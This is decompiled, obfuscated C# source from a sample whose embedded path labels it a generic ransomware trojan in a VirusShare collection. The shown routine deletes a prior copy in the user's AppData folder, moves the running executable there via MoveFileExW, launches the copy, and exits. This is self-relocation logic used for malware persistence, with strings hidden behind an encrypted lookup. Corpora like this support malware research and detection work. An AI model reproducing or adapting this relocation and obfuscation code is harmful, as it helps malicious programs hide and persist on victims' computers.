// Decompiled with JetBrains decompiler
// Type: .
// Assembly: msn, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: C3204E8B-C6C9-4864-AB4A-50B3E5132C84
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-57375c6c5fdf5cb633258ada4e91cf8f7605a4cb97903a0ea974e04b7dacd954.exe

using \u0006;
using \u000E;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace \u0006
{
  internal class \u008A\u001A
  {
    public class \u000E\u0004
    {
      [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int \u009E\u0003(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

      [DllImport("kernel32", EntryPoint = "ExitProcess", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int \u0003\u0004([In] uint obj0);

      [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int \u0004\u0004([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string _param1, long _param2);

      public static void \u0008\u0004()
      {
        try
        {
          if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(2502), \u0008.\u0007(285))))
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(2551), \u0008.\u0007(285)));
          string fileName1 = Process.GetCurrentProcess().MainModule.FileName;
          string fileName2 = Process.GetCurrentProcess().MainModule.FileName;
          int Length = \u008A\u001A.\u000E\u0004.\u009E\u0003(0, ref fileName2, 256);
          \u008A\u001A.\u000E\u0004.\u0004\u0004(Strings.Left(fileName1, Length), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(2600), \u0008.\u0007(285)), 8L);
          Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(2649), \u0008.\u0007(285)));
          \u008A\u001A.\u000E\u0004.\u0003\u0004(0U);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
